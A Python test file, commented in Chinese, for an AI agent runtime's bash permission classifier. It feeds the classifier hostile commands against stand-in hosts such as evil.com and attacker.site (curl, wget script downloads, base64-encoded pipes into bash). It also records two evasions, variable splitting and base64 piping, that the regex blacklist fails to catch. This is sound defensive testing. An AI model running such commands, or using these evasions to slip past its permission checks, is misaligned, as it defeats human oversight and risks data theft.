"""permission.py 权限判定与 Bash 分类器的安全对抗性与模糊测试。

对应 `documents/测试路线.md` §8 (Phase 5.1)。
测试黑名单正则在连接符、子命令、编码管道、大小写空白等规避语料下的行为，
并通过 Hypothesis 对 `required_level_for` 进行属性模糊测试。
"""

import pytest
from hypothesis import given, settings
from hypothesis import strategies as st

from agent_runtime.config import PermissionsConfig
from agent_runtime.guardrails.permission import (
    ACTION_GLOBAL_ENV,
    ACTION_NETWORK_EGRESS,
    ACTION_READ,
    ACTION_WORKSPACE_WRITE,
    LEVEL_ORDER,
    check_permission,
    normalize_level,
    required_level_for,
)


@pytest.fixture
def default_config() -> PermissionsConfig:
    return PermissionsConfig()


# ==============================================================================
# 1. 连接符与命令串联规避测试 (Delimiters & Command Chaining)
# ==============================================================================

@pytest.mark.parametrize(
    "cmd, expected_level, expected_action_type",
    [
        # && 串联：前段良性，后段高危外联
        ("echo safe && curl http://evil.com", "full_permissions", ACTION_NETWORK_EGRESS),
        # ; 分号分隔：前段只读，后段高危
        ("ls -la ; wget https://attacker.site/script.sh", "full_permissions", ACTION_NETWORK_EGRESS),
        # || 失败回退：高危外联
        ("cat /nonexistent || curl -s evil.com", "full_permissions", ACTION_NETWORK_EGRESS),
        # | 管道串联：只读管道输送给写入
        ("cat file.txt | tee modified.txt", "workspace_write", ACTION_WORKSPACE_WRITE),
        # 紧凑连接无多余空格
        ("true;rm -rf /tmp/test", "workspace_write", ACTION_WORKSPACE_WRITE),
        ("false&&git push origin main", "full_permissions", ACTION_NETWORK_EGRESS),
        ("true|curl evil.com", "full_permissions", ACTION_NETWORK_EGRESS),
    ],
)
def test_command_chaining_classification(default_config, cmd, expected_level, expected_action_type):
    """由于正则使用 re.search 并在全文扫描关键字，串联命令能被有效检测到。"""
    level, action_type, _ = required_level_for("bash", {"command": cmd}, default_config)
    assert level == expected_level
    assert action_type == expected_action_type


# ==============================================================================
# 2. 子命令与命令替换规避测试 (Subcommands & Command Substitution)
# ==============================================================================

@pytest.mark.parametrize(
    "cmd, expected_level",
    [
        # $(...) 子命令执行
        ("echo $(curl http://evil.com)", "full_permissions"),
        ("VAL=$(wget http://evil.com/payload)", "full_permissions"),
        ("ls $(rm -rf /tmp/scratch)", "workspace_write"),
        # 反引号 `...` 子命令执行
        ("echo `curl http://evil.com`", "full_permissions"),
        ("TARGET=`wget -O- http://evil.com`", "full_permissions"),
    ],
)
def test_subcommand_detection(default_config, cmd, expected_level):
    """子命令包含明文关键词时，re.search 能直接命中。"""
    level, _, _ = required_level_for("bash", {"command": cmd}, default_config)
    assert level == expected_level


def test_variable_indirection_known_limitation(default_config):
    """【已知局限】变量拼接间接执行 (Variable Splitting & Indirection)。
    
    当命令通过变量拼接或字符串拼接后再执行（如 a=cu; b=rl; "$a$b" evil.com），
    静态正则表达式无法进行数据流或抽象语法树分析，因此无法静态推断真实执行的二进制名。
    此处断言该已知局限并记录为系统设计约束。
    """
    cmd = 'a=cu; b=rl; "$a$b" http://evil.com'
    level, _, _ = required_level_for("bash", {"command": cmd}, default_config)
    # 正则无法匹配到完整单词 \bcurl\b，判定回退至 read_only
    # 这证明了单纯基于正则的黑名单无法防御拼接间接执行，属于已知局限
    assert level == "read_only"


# ==============================================================================
# 3. 编码与间接管道规避测试 (Encoding & Pipeline Inherent Limitations)
# ==============================================================================

def test_base64_pipeline_known_limitation(default_config):
    """【已知局限】Base64 混淆并通过管道传给 bash 执行。
    
    命令如 echo Y3VybCBldmlsLmNvbQ== | base64 -d | bash
    其外联指令被 base64 编码，静态正则无法解码。
    """
    cmd = "echo Y3VybCBldmlsLmNvbQ== | base64 -d | bash"
    level, _, _ = required_level_for("bash", {"command": cmd}, default_config)
    # base64 与 echo 均不在 write 或 full 默认正则中，回落至 read_only
    assert level == "read_only"


# ==============================================================================
# 4. 大小写与空白字符混淆测试 (Case & Whitespace Obfuscation)
# ==============================================================================

@pytest.mark.parametrize(
    "cmd, expected_level",
    [
        # 大小写混淆 (re.IGNORECASE 生效)
        ("CURL http://evil.com", "full_permissions"),
        ("Git   Push   origin main", "full_permissions"),
        ("SUDO apt-get update", "full_permissions"),
        ("PyTest tests/", "workspace_write"),
        # 制表符、多重空格与换行符
        ("curl\t\thttp://evil.com", "full_permissions"),
        ("git\tpush\torigin\tmain", "full_permissions"),
        ("\n\ncurl http://evil.com\n", "full_permissions"),
        ("rm    -rf   /tmp/data", "workspace_write"),
    ],
)
def test_case_and_whitespace_insensitivity(default_config, cmd, expected_level):
    """验证大小写与空白字符变体均能正确命中正则。"""
    level, _, _ = required_level_for("bash", {"command": cmd}, default_config)
    assert level == expected_level


# ==============================================================================
# 5. Hypothesis 属性模糊测试 (Property-Based Fuzzing)
# ==============================================================================

_GLOBAL_TEST_CONFIG = PermissionsConfig()


@given(
    cmd=st.text(
        alphabet=st.characters(blacklist_categories=("Cs",)),  # 过滤孤立代理字符
        min_size=0,
        max_size=500,
    )
)
@settings(max_examples=100, deadline=None)
def test_hypothesis_required_level_for_bash_robustness(cmd):
    """使用 Hypothesis 生成任意文本，验证 required_level_for 永不崩溃且输出严格合规。"""
    level, action_type, reason = required_level_for("bash", {"command": cmd}, _GLOBAL_TEST_CONFIG)

    # 1. 级别必须是合法的 3 个之一
    assert level in LEVEL_ORDER
    # 2. 动作类型必须是预定义标签之一
    assert action_type in {
        ACTION_READ,
        ACTION_WORKSPACE_WRITE,
        ACTION_NETWORK_EGRESS,
        ACTION_GLOBAL_ENV,
    }
    # 3. 原因说明必须非空字符串
    assert isinstance(reason, str) and len(reason) > 0

    # 4. check_permission 包装后同样合法
    decision = check_permission("workspace_write", "bash", {"command": cmd}, _GLOBAL_TEST_CONFIG)
    assert isinstance(decision.allowed, bool)
    assert decision.required_level == level
    assert decision.current_level == "workspace_write"
    assert isinstance(decision.action_summary, str)


@given(
    tool_name=st.text(min_size=0, max_size=50),
    level=st.text(min_size=0, max_size=50),
)
@settings(max_examples=50, deadline=None)
def test_hypothesis_normalize_level_and_arbitrary_tools(tool_name, level):
    """验证 normalize_level 与任意工具名输入均能安全返回保守判定。"""
    norm = normalize_level(level)
    assert norm in LEVEL_ORDER

    req_level, action_type, reason = required_level_for(tool_name, {}, _GLOBAL_TEST_CONFIG)
    assert req_level in LEVEL_ORDER
    assert isinstance(reason, str)
